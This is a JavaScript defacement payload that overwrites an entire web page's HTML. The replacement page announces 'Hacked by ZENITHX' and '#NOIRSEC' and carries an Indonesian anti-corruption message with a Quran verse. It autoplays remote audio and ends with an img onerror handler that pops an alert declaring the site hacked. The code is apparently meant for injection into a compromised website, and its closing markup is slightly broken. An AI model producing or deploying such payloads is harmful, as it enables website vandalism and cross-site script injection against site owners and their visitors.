document.documentElement.innerHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Hacked by ZENITHX</title>

<!-- Fonts -->
<link href="https://fonts.googleapis.com/css2?family=Josefin+Sans:wght@400;700&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Waterfall&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Reggae+One&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Scheherazade+New&display=swap" rel="stylesheet">

<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}
body, html {
  background: #000;
  font-family: 'Trebuchet MS', sans-serif;
  text-align: center;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  justify-content: center;
}
.main-container {
  width: 100%;
  max-width: 1200px;
  margin: 0 auto;
  padding: 20px;
  animation: fadeIn 1.5s ease-in-out;
}
@keyframes fadeIn {
  from { opacity: 0; }
  to { opacity: 1; }
}
.logo {
  max-width: 35%;
  height: auto;
  margin-bottom: 15px;
  transition: transform 0.3s ease;
}
.logo:hover { transform: scale(1.02); }
.hacker-signature {
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 5px;
  margin-bottom: 15px;
  font-size: 1.3rem;
}
.hacked-by {
  font-family: 'Reggae One', cursive;
  color: red;
}
.hacker-name {
  font-family: 'Reggae One', cursive;
  color: white;
  position: relative;
  margin-right: 8px;
}

.noirsec {
  font-family: 'Reggae One', cursive;
  position: relative;
  margin-left: 8px; 
  animation: flash 1s infinite;
}

@keyframes flash {
  0% { color: red; text-shadow: 0 0 8px red; }
  50% { color: white; text-shadow: 0 0 8px white; }
  100% { color: red; text-shadow: 0 0 8px red; }
}

.glitch {
  animation: glitch 1s infinite;
}
@keyframes glitch {
  0% { text-shadow: 2px 2px red, -2px -2px blue; }
  20% { text-shadow: -2px -2px red, 2px 2px blue; }
  40% { text-shadow: 2px -2px red, -2px 2px blue; }
  60% { text-shadow: -2px 2px red, 2px -2px blue; }
  80% { text-shadow: 2px 2px red, -2px -2px blue; }
  100% { text-shadow: -2px -2px red, 2px 2px blue; }
}
.divider {
  width: 80%;
  max-width: 600px;
  height: 2px;
  margin: 30px auto;
  background: linear-gradient(to right, transparent, #ff0000, transparent);
  border-radius: 2px;
}
.message-container { margin-bottom: 25px; }
.ambatukam-text {
  color: #FF0000;
  text-transform: uppercase;
  font-size: 1.8rem;
  margin-bottom: 15px;
  text-shadow: 0 0 8px rgba(255, 0, 0, 0.6);
  letter-spacing: 2px;
  font-weight: bold;
  padding: 0 10px;
}
.challenge-text {
  color: #ff4d4d;
  text-shadow: 0 0 8px rgba(255,0,0,0.8),0 0 15px rgba(255,0,0,0.6);
  font-weight: bold;
  text-transform: uppercase;
  font-size: 1.1rem;
  line-height: 1.6;
  margin-bottom: 20px;
  padding: 0 10px;
}
.arabic-text {
  display: block;
  font-family: 'Scheherazade New','Noto Naskh Arabic',serif;
  font-size: 1.4rem;
  direction: rtl;
  text-align: center;
  color: #fff;
  text-shadow: 0 0 12px #ff0000;
}
.translation {
  display: block;
  font-size: 1rem;
  margin-top: 6px;
  color: #ccc;
}
.audio-player {
  width: 100%;
  max-width: 400px;
  margin: 0 auto 25px;
  border-radius: 50px;
  overflow: hidden;
  box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
}
.palestine-text {
  color: #FFFFFF;
  font-size: 2rem;
  letter-spacing: 3px;
  font-family: 'Waterfall', cursive;
  margin-top: 15px;
  text-shadow: 0 0 10px rgba(151, 233, 0, 0.7);
  animation: pulse 2s infinite;
}
@keyframes pulse {
  0% { text-shadow: 0 0 10px rgba(151, 233, 0, 0.7); }
  50% { text-shadow: 0 0 20px rgba(151, 233, 0, 1); }
  100% { text-shadow: 0 0 10px rgba(151, 233, 0, 0.7); }
}
@media (min-width: 768px) {
  .ambatukam-text { font-size: 2.5rem; letter-spacing: 4px; }
  .challenge-text { font-size: 1.3rem; padding: 0 100px; }
  .palestine-text { font-size: 2.8rem; letter-spacing: 5px; }
  .hacker-signature { font-size: 1.5rem; }
}
@media (max-width: 767px) {
  .logo { max-width: 90%; }
  .ambatukam-text { font-size: 1.5rem; }
  .challenge-text { font-size: 1rem; }
  .palestine-text { font-size: 1.8rem; }
  .hacker-signature { font-size: 1.1rem; flex-direction: column; }
}
</style>
</head>
<body>
<div class="main-container">
  <img src="https://files.catbox.moe/byyfsx.jpg" alt="Logo" class="logo">
  
  <div class="hacker-signature">
     <span class="hacked-by">Hacked By</span>
     <span class="hacker-name">ZENITHX</span>
     <span class="noirsec">#NOIRSEC</span>
  </div>

  <div class="message-container">
    <p class="ambatukam-text">BLACKHAT</p>
    <img src="https://files.catbox.moe/t44qr9.jpg" alt="Logo" class="logo">
    
    <p class="challenge-text">
      Negara ini memang sudah merdeka dari penjajahan asing,<br>
      tapi kini kita dijajah oleh para pejabat rakus dan tidak bertanggung jawab.<br><br>
      Mereka duduk di kursi kekuasaan bukan untuk mengabdi,<br>
      melainkan untuk memperkaya diri. Rakyat menjerit, keadilan dipermainkan, dan amanah dikhianati.<br><br>
      <span class="arabic-text">وَلَا تُفْسِدُوا فِي الْأَرْضِ بَعْدَ إِصْلَاحِهَا</span>
      <span class="translation">“Dan janganlah kamu berbuat kerusakan di muka bumi setelah (Allah) memperbaikinya…”<br>(QS. Al-A’raf: 56)</span><br><br>
      Wahai para koruptor, berapa banyak lagi generasi yang harus dikorbankan agar kalian bisa menambah satu digit saldo di rekening?<br>
      Tidakkah kalian takut pada tangis rakyat yang mendoakan keadilan turun dari langit?<br>
      Tidakkah kalian sadar, kekuasaan yang kalian genggam sekarang hanya sementara?<br>
      Akan datang hari di mana semua akan diminta pertanggungjawaban, bukan oleh jaksa, tapi oleh semesta.<br><br>
      <span style="color:#ff0000;">#fuckindonesiagelap</span><br>
      <span style="color:#ff0000;">#fuckkoruptor</span>
    </p>
     
    <audio controls autoplay class="audio-player">
      <source src="https://files.catbox.moe/iuzcvj.mp4" type="audio/mpeg">
      Browser kamu tidak mendukung elemen audio.
    </audio>

    <p class="palestine-text">ZENITHX || BLACKHAT</p>

    <img src="x" alt="error" onerror="alert('17 agustus 2025 situs ini telah di retas')">
  </div>
</div>
</body>

</
 `;
    
html>
